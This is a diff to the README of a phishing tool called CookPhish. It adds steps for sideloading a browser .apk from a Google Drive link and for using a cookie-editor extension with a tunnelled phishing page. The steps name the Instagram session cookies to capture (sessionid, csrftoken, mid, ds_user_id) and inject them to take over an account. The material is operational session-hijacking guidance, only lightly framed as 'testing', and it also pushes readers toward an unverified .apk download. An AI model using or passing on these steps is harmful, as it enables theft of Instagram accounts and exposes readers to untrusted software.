@@ -92,6 +92,27 @@ chmod +x CookPhish
 
 ---
 
+## 📲 Recommended Browser for Mobile (Cookie Editor Support)
+
+If you're testing **CookPhish** on Instagram using a mobile device, you'll need a browser that supports extensions like **Cookies Editor**.
+
+👉 **Download the recommended browser app (.apk)** that supports cookie injection and browser extensions:  
+[📥 Click to Download (.apk)](https://drive.google.com/file/d/1fOCiLEs-2aPlCQSCWVaXnIC-vYc79Y-7/view?usp=drivesdk)
+
+
+## 🔧 How to Use (With Cookies Editor Extension)
+
+1. Install the browser using the link above.
+2. Open the browser and visit the **Chrome Web Store**.
+3. Search and install the **Cookies Editor** extension.
+4. Launch the phishing page hosted by CookPhish (e.g. via `cloudflared` or `tunnelmole`).
+5. Open **Cookies Editor** and find important cookies like:
+   - `sessionid`
+   - `csrftoken`
+   - `mid`
+   - `ds_user_id`
+6. Modify or inject the cookies to simulate an authenticated session.
+
 ## 📸 Screenshots
 
 <p align="center">
